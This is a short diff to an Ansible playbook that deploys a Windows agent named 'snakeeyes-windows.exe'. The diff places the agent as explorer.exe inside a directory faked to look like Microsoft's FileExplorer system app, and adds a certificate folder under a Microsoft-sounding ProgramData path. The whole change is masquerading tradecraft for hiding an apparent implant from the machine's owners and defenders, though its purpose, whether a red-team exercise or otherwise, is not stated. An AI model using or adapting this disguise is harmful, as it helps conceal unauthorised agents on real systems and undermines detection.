@@ -1,13 +1,18 @@
 ---
 - name: Ensure agent directory exists
   ansible.windows.win_file:
-    path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb"
+    path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\"
     state: directory
 
 - name: Copy Windows agent executable
   ansible.windows.win_copy:
-    src: "snakeeyes-windows"
+    src: "snakeeyes-windows.exe"
     dest: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"
+
+- name: Ensure cert directory exists
+  ansible.windows.win_file:
+    path: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\"
+    state: directory
 
 - name: Copy CA cert to Windows Host
   ansible.windows.win_copy:
